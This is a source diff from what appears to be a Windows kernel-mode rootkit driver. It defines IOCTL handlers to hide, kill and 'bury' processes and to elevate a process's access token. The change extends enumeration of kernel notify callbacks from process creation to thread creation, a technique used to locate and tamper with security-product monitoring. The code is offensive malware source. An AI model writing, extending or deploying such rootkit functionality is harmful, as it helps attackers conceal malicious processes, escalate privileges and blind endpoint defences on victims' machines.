@@ -32,7 +32,8 @@ typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
 
 #define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define BE_IOCTL_ENUMERATE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 typedef struct _CALLBACK_DATA {
     UINT64 driverBase;
@@ -50,7 +51,7 @@ NTSTATUS BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize);
 NTSTATUS BeIoCtlElevateProcessAcessToken(HANDLE pid);
 NTSTATUS BeIoctlKillProcess(HANDLE pid);
 NTSTATUS BeIoctlHideProcess(HANDLE pid);
-NTSTATUS BeIoctlEnumerateCallbacks(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
+NTSTATUS BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -122,11 +123,17 @@ BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
             }
             break;
 
-        case BE_IOCTL_ENUMERATE_CALLBACKS:
+        case BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS:
             {
-                status = BeIoctlEnumerateCallbacks(Irp, pIoStackIrp, &dwDataWritten);
+                status = BeIoctlEnumerateCallbacks(CreateProcessNotifyRoutine, Irp, pIoStackIrp, &dwDataWritten);
             }
             break;
+
+        case BE_IOCTL_ENUMERATE_THREAD_CALLBACKS:
+        {
+            status = BeIoctlEnumerateCallbacks(CreateThreadNotifyRoutine, Irp, pIoStackIrp, &dwDataWritten);
+        }
+        break;
         }
     }
 
@@ -379,13 +386,14 @@ BeIoctlHideProcess(HANDLE pid)
 /**
  * Enumerates kernel callbacks
  *
+ * @param type Type of callback to resolve
  * @param Irp Pointer to the IO Request Packet (IRP)
  * @param pIoStackIrp Pointer to the caller's I/O stack location in the specified IRP.
  * @param pdwDataWritten pointer to an ULONG containing the bytes written to the outBuffer
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeIoctlEnumerateCallbacks(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
+BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
 {
     NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
     LOG_MSG("IOCTL enumerate callbacks");
@@ -395,7 +403,7 @@ BeIoctlEnumerateCallbacks(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDa
         CALLBACK_DATA* pOutputBuffer = (CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;
 
         // find callbacks
-        auto callbackVector = BeEnumerateKernelCallbacks_ProcessCreate();
+        auto callbackVector = BeEnumerateKernelCallbacks(type);
 
         // setup buffer
         ULONG dwDataSize = callbackVector.size() * sizeof(CALLBACK_DATA);
